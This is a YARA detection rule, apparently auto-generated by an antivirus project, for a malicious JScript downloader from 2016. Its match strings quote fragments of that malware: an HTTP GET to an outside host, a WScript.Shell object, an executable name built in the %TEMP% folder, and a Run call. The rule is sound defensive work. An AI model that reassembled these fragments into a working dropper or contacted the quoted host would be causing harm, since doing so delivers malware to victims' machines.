rule sig_20160401_7972902fc6152d605e93ee3270a7b233 {
  meta:
    description = "datamaliciousorder - file 20160401_7972902fc6152d605e93ee3270a7b233.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "19e06c30833dae9da0b76c76931215e1a3aee496545f52b94d3a3c5827d70874"

  strings:
    $s1  = "YzfAc[SkGp](\"G\" + \"ET\", \"http://echo-gs.net/h6dskl\", false);" fullword ascii
    $s2  = "var UbqRc = function OxsUea() {return WScript[FzXo](\"WScript\"+\".Shell\");}(), ZgdEku = 11;" fullword ascii
    $s3  = "function ZrHy(DrhDik, RndZhq){QuxDyw = QuxDyw * 1; return DrhDik - RndZhq;};" fullword ascii
    $s4  = "if (YzfAc[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function EguRmy() {return UbqRc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"mLweTG9q4wkn6.ex\" + \"e\";};" fullword ascii
    $s6  = "function XpEyz(){return WbJqi + \"\";};" fullword ascii
    $s7  = "function RbqLo() {return ((DnoJb == true) && (DnoJb == XciKg)) ? 1 : QuxDyw;};" fullword ascii
    $s8  = "return ZrHy(EbFv, BxkEtp);" fullword ascii
    $s9  = "var QkwWbr = new this[\"Date\"]();" fullword ascii
    $s10 = "function ZxRo(LjIpr) {var GbZps = (1, 2, 3, 4, 5, LjIpr); return GbZps;};" fullword ascii
    $s11 = "function OqyWbh(){return 23;};" fullword ascii
    $s12 = "function UfSuv()" fullword ascii
    $s13 = "XciKg = true; " fullword ascii
    $s14 = "function BmgVjm(){return FzXo;};" fullword ascii
    $s15 = "var XciKg = false;" fullword ascii
    $s16 = "var JylQbc = false;" fullword ascii
    $s17 = "}while (AhoKb);" fullword ascii
    $s18 = "DnoJb = true; " fullword ascii
    $s19 = "var DnoJb = false;" fullword ascii
    $s20 = "function LhdEp(AjrDo){UbqRc[\"R\"+\"un\"](AjrDo, QuxDyw, QuxDyw);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}